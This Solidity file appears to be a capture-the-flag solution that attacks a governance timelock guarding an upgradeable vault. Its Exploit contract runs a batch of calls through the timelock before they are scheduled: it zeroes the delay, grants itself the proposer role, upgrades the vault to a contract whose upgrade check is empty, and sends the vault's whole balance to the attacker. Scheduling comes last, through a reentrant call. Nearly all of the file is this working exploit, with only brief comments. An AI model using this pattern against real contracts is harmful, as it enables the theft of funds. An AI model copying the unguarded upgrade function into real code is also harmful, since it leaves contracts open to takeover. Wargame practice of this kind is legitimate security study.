// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./TheKingIsDeadLongLiveTheKing.sol";

contract NewKingVault is UUPSUpgradeable {
    using Address for address payable;

    function transfer(address payable recipient) external {
        recipient.sendValue(address(this).balance);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract Exploit {
    GovernanceTimelock private immutable timelock;
    KingVault private immutable kingVault;
    NewKingVault private immutable newKingVault;
    address private immutable owner;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;

    constructor(KingVault instance) payable {
        kingVault = instance;
        timelock = GovernanceTimelock(payable(instance.owner()));
        newKingVault = new NewKingVault();
        owner = msg.sender;
    }

    function finalize() external {
        // Encode timelock update delay call
        bytes memory timelockData = abi.encodeWithSelector(
            GovernanceTimelock.updateDelay.selector,
            uint64(0)
        );

        // Add update delay call to array
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(timelockData);

        // Encode Access control grant role
        bytes memory accessControlData = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            timelock.PROPOSER_ROLE(),
            address(this)
        );

        // Add grante role call to array
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(accessControlData);

        // Encode transfer call
        bytes memory transferData = abi.encodeWithSelector(
            NewKingVault.transfer.selector,
            owner
        );

        // Encode UUPS upgrade call
        bytes memory vaultData = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeToAndCall.selector,
            address(newKingVault),
            transferData
        );

        // Add upgrade and call to array
        targets.push(address(kingVault));
        values.push(0);
        dataElements.push(vaultData);

        // Encode schedule call
        bytes memory scheduleData = abi.encodeWithSelector(
            Exploit.schedule.selector
        );

        // Add schedule reentrancy call to array
        targets.push(address(this));
        values.push(0);
        dataElements.push(scheduleData);

        // Execute calls in timelock
        timelock.execute(targets, values, dataElements, bytes32(0));
    }

    // Schedule the execute call to be successful
    function schedule() external {
        timelock.schedule(targets, values, dataElements, bytes32(0));
    }
}
